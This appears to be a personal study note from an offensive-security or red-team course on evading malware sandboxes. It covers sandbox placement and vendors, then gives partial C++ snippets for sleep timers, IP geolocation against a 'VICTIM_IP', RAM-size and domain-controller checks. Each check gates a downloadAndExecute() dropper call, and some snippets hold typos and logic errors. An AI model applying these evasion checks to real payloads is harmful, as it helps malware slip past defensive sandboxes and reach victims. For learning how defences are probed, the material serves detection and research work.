# What is
Running the file in a virtualized environment, a sandbox, is used to provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allow it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network.
![[Pasted image 20241008170937.png]]
For example, in this diagram we have three different sandboxes in place. It is not uncommon for there to be one, two, or more, Sandboxes in a corporate environment. Often we may find them in the following places:
- [[Firewalls]]
- Mail Servers
- [[Antivirus|Workstations]]
Each sandbox may work differently, for example, a firewall may execute the attachment in the email and see what kind of network communications occur, whereas as a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based AV Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system.
There are many Sandbox vendors that the Blue Team may use, some examples are:
- Palo Alto Wildfire ([Firewall](https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire))
- Proofpoint TAP ([Email Sandbox](https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection))
- Falcon Sandbox ([EDR/Workstation](https://www.crowdstrike.co.uk/products/threat-intelligence/falcon-sandbox-malware-analysis/))
- MimeCast ([Email Sandbox](https://www.mimecast.com/))
- VirusTotal ([Sample Submission Site](https://www.virustotal.com/))
- Any.Run ([Sample Submission Site](https://any.run/))
- Antiscan.me ([Sample Submission Site](https://antiscan.me/))
- Joe Sandbox ([Sample Submission Site](https://www.joesandbox.com/))

# Hibernating
Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandbox queue drastically. This is a crucial aspect that we can abuse. If we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways, one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After five minutes, being normal execution.
Another popular method is to do complex, compute-heavy math, which may take a certain amount of time - For example, calculating the Fibonacci sequence up to a given number. Tho this may take more or less depending on the system's hardware. Masking our application is generally a good idea to avoid AV detections in general, so this should already be something in our toolkit like this.
Now, Beware fellow traveler, as some sandboxes may alter built-in sleep functions, various AV vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended we develop our own sleep function. Here are some posts about bypassing Sleep functions.
- [https://evasions.checkpoint.com/src/Evasions/techniques/timing.html](https://evasions.checkpoint.com/src/Evasions/techniques/timing.html)  
- [https://www.joesecurity.org/blog/660946897093663167](https://www.joesecurity.org/blog/660946897093663167)
## Implementation
Parting from a simple [[AV Evasion Shellcode#Staged payloads|Dropper]], we can add a Sleep statement for 2 minutes. Generally we would want a time closer to 5 mins to be suer, but 2 will me enough for testing.
```cpp
int main(){
	sleep(120000);
	downloadAndExecute();	
}
```
And congrats, we now have evaded some sandboxes. Now, this is not the beset thing as there are ways to bypass sleep timers, a better solution would be to waste computing time by doing heavy math.

# Geolocation and Geoblocking
One defining factor of sandboxes is that they are often located off-premise and are hosted by AV providers. If we know we are attacking a company in the US and our binary is executed in London, we can make an educated guess that the binary has ended up in a Sandbox. We may choose to implement a geolocation filter on our program that checks if the IP address block is owned by the company we are targeting or if its from a residential address space. There are several services that we can use to check this information.
- [ifconfig.me](https://ifconfig.me/)
- [https://rdap.arin.net/registry/ip/1.1.1.1](https://rdap.arin.net/registry/ip/1.1.1.1)
IfConfig.me can be used to retrieve our current IP address, with additional information being optional. Combining this with ARIN's RDAP allows us to determine the ISP returned in an easy to parse format (JSON).
It is important to note that this method will only work if the host has internet access. Some organizations may build a block list of specific domains, so we should be 100% sure that his method will work for the organization we are attempting to leverage this against.
## Implementation
Now, for this method, we will be making a simple comparison between IPs, normally a sandbox will have a different IP than the target server, so we will get the sandbox IP from the website, to then compare it with the target's IP, if it is correct we can then proceed.
```cpp
BOOL checkIP() {   
 // Declare the Website URL that we would like to visit
    const char* websiteURL = "<https://ifconfig.me/ip>";   
 // Create an Internet Stream to access the website
    IStream* stream;   
 // Create a string variable where we will store the string data received from the website
    string s;   
  // Create a space in memory where we will store our IP Address
    char buff[35];   
    unsigned long bytesRead;   
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
 // While data is being sent from the webserver, write it to memory
    while (true) {       
        stream->Read(buff, 35, &bytesRead);       
        if (0U == bytesRead) {           
            break;       
        }       
        s.append(buff, bytesRead);   
    }   
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {       
        return TRUE;   
    }   
    else {       
    return FALSE;   
    }
}

int main(){
	if(checkIP() == TRUE){
		donwloadAndExecute();
		return 0;
	} else {
		cout << "HTTP/444 - I'm good!"
		return 0;
	}
}
```
Now, this is a pretty common TTP used by both APTs and Red Teamers, using services to check the "Abuse info" of an IP address to gather information about an IP address to determine if it is legitimate or not is most often than not flagged as malicious activity or at least very suspicious. Just by trying to access ifconfig.me we already can flag systems about our program.
This is important because not all techniques may be important or even helpful in some situations, so creating a specialized payload for a specific situation is the best we can do.

# Checking System Information
Another incredibly popular method is to observe system information. Most sandboxes typically have reduced resources. A popular malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine.
Most workstations in a network typically have 2-8 CPU cores, 8-32GB or RAM, and 256GB-1TB+ of drive space. This is incredibly dependant on the organization that we are targeting, but generally, we can expect more than 2 CPU cores per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core count, RAM amount, Disk size, etc.).
Some additional things we may be able to filter on:
- Storage Medium Serial Number
- PC Hostname
- BIOS/UEFI Version/Serial Number
- Windows Product Key/OS Version
- Network Adapter Information
- Virtualization Checks
- Current Signed in User
## Implementation
For this technique, we are going to go off based on the amount of RAM a system has. It is important to note that windows measures data in a non-standard format. If we have ever bought a computer that said it has 256GB of storage, after turning it on, we would have closer to 240GB. This is because Windows measures data in units of 1024-bytes (kiB), instead of 1000-bytes(kB).
To determine how much memory is installed, we only need the Windows header file included, and we can call a specific Windows API, `GlobalMemoryStatusEx`, to retrieve the data for us. To get this information, we must declare the `MEMORYSTATUSEX` struct, then, we must set the size of the `dwLength` member to the seize of the struct. Once that is done, we can then call the `GlobalMemoryStatusEx` API to populate the struct with the memory information.
In this case, we are only interested in the total amount of physical memory installed on the system, so we will print out the `ullTotalPhys` member of the `MEMORYSTATUSEX` struct to get the size of the memory in Bytes. Then divide it by 1024 three times to get the value of memory in GiB.
```c++
BOOL memoryCheck() {
//  Declare the MEMORYSTATUSEX Struct    
	MEMORYSTATUSEX statex;
//  Set the length of the struct to the size of the struct    
	statex.dwLength = sizeof(statex);
//  Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
	GlobalMemoryStatusEx(&statex);
//  Check if system memory is greater than 5 GiB
	if(statex.ullTotalPhys/1024/1024/1024 >= 5.00){
	   return TRUE;
	} else {
	   return FALSE;
	}
} 

int main(){
	if(memoryCheck() == TRUE){
		downloadAndExecute();
	} else {
		exit;
	}
	return 0;
}
```


# Querying Network Information
The last method is the most open-ended method of this list. Because of this it is considered one of the more advanced methods as it involves querying information about the Active Directory domain.
Almost no Malware Sandboxes are joined in a domain, so it's relatively safe to assume if the machine is not joined to a domain, it is not the right target. However, we cannot always be too sure, so we should collect some information about the domain to be safe. There are many objects that we can query:
- Computers
- User accounts
- Last User Login(s)
- Groups
- Domain Admins
- Enterprise Admins
- Domain Controllers
- Service Accounts
- DNS Servers
These techniques can vary in difficulty, therefore, we should consider how much time and effort we want to spend building out these evasion methods. A simple method, such as checking the systems environment variables (`echo %VARIABLE%` or to display all variables, use `set`) for an item like the LogonServer, LogonUserSid, or LogonDomain may be much easier than implementing a Windows API.
## Implementation
For the last evasion technique, we will be querying information about the [[Active Directory|AD]] domain. We will be keeping it simple by querying the name of a Domain controller using the `NetGetDCName` Windows API. This is a relatively simple Windows API that fetches the primary domain controller within the environment. This requires us to specify a pointer to a string for the DC Name to be put into. 
```cpp
BOOL isDomainController(){
//  Create a long pointer to Wide String for our DC Name to live in
    LPCWSTR dcName;  
//  Query the NetGetDCName Win32 API for the Domain Controller Name
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
//  Convert the DCName from a Wide String to a String
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
//  Search if the UNC path is referenced in the dcNewName variable. If so, there is likely a Domain Controller present in the environment. If this is true, pass the check, else, fail.
    if (dcNewName.find("\\\\"){
	    return TRUE;
    } else {
		return FALSE;
    }
} 

int main(){
	if (isDomainController() == TRUE){
		downloadAndExecute();
	} else {
		cout << "Domain Controller Not Found";
	}
	return 0;
}
```